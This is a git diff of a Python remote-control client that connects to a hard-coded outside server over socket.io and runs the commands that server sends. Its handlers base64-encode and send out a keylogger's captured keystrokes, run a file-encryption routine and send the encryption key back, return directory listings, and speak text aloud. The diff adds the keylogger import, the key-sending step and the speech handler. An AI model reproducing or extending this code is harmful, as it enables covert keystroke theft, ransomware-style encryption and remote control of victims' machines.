@@ -1,6 +1,12 @@
 from socketIO_client import SocketIO, BaseNamespace
 from sysPathList import *
 import base64
+from encryptFS import *
+sys.path.insert(0, r'tools/')
+import Tracket
+from multiprocessing import Process
+
+
 
 
 class ChatNamespace(BaseNamespace):
@@ -37,17 +43,20 @@ def fileDirReturn(data):
 def keyLogReturn(data):
 
 		
-	file = open("Tracketlog.txt", 'rb')
+	file = open("python-tools/Tracketlog.txt", 'rb')
 	fileread = file.read()
 	encode = base64.encodestring(fileread)
-	socketIO.emit("fileData", {'file':"keyloggerLog.txt", 'filedata': encode})
+	socketIO.emit("keylogData", {'file':"keyloggerLog.txt", 'filedata': encode})
 
 def encryptStuff(data):
 	encryptionExecute()
 	file = open("pass.txt", 'rb')
 	fileread = file.read()
 	encode = base64.encodestring(fileread)
-	socketIO.emit("fileData", {'file':"pass.txt", 'filedata': encode})
+	socketIO.emit("encryptData", {'key': key})
+
+def tts(data):
+	speak(data['text'])
 
 
 socketIO = SocketIO('andrewarpasi.com', 6969)
@@ -57,6 +66,6 @@ socketIO.on("feedback", reply)
 socketIO.on('fileReq', fileDirReturn)
 socketIO.on('keyLog', keyLogReturn)
 socketIO.on('encrypt', encryptStuff)
-socketIO.on('fileReq', fileDirReturn)
+socketIO.on('tts', tts)
 
 socketIO.wait_for_callbacks(seconds=20)
